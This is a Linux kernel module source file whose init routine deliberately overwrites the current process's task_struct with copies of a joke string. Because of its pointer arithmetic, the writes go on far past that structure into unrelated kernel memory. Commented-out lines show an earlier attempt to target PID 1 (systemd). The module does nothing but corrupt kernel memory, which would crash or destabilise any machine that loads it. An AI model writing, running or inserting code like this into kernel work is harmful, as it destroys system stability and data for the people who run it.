#include <linux/init.h> 	// Required __init macro and 
#include <linux/module.h> 	// Required for module functions
#include <linux/pid.h>
#include <linux/kernel.h>
#include <linux/sched.h>

/**
 * Prototypes
 * 
 * entry_func
 *   - is registered later as the function to call when the module is loaded
 *   - `__init` causes the function to be discarded and its memory freed once
 *     it finishes executing. 
 *      - Apparently, this applies only to built in modules and is ignored in
 *        loadable modules? goo.gl/UDaO5q, goo.gl/WixTkW
 * 
 * exit_func
 *   - Registered later as the callback function when the module is removed
 *   - `__exit` will omit the marked function all together for built in modules
 *     but does nothing for loadable ones.
 */
static int __init entry_func(void);
static void __exit exit_func(void);

static int __init entry_func(void) {
	char* corrupt_string;
	int corrupt_copies, i;
        struct task_struct *c;

//	printk("ADDR: %lx\n", find_get_pid(1));
//	systemd_task_struct = pid_task(find_get_pid(1), PIDTYPE_PID);
//	systemd_task_struct = pid_task(find_vpid(1), PIDTYPE_PID);
	corrupt_string = "WHAT'S A GHOST'S FAVORITE LUNCH MEAT? BOOLOGNA! ";
	corrupt_copies = (sizeof(struct task_struct) / strlen(corrupt_string));
	c = current;
	for(i = 0; i < corrupt_copies; i++) {
		memcpy((void*) c, (void*) corrupt_string, strlen(corrupt_string));
		c = c + strlen(corrupt_string);
	}
	return 0;
}

static void __exit exit_func(void) {
        printk("leaving\n");
}

// Regsisters entry_func as the function to call when module loads
module_init(entry_func);

// Registers exit_func as the function to call when module is removed.
module_exit(exit_func);

